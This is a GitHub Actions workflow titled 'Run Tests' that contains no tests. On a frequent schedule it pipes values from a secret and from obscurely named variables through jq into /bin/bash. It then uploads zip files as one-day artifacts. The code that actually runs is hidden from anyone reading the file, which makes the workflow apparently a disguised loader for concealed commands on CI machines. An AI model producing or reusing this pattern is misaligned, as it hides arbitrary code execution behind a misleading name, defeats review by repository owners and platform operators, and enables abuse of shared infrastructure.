name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '35 4,10,16,22 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          xxj400: ${{ secrets.xxj400 }}
        run: |
          printf '%s' "$xxj400" | jq -r .qhd3 | /bin/bash
          echo $b479 | jq -r .ffp51234 | /bin/bash
          echo $gsm18 | jq -r .dnq9510 | /bin/bash
          printf '%s' "$qjihu71499" | jq -r .aem17960 | /bin/bash

      - name: Save output
        uses: actions/upload-artifact@v4
        with:
          name: ncrFeTJz
          path: "*.zip"
          retention-days: 1
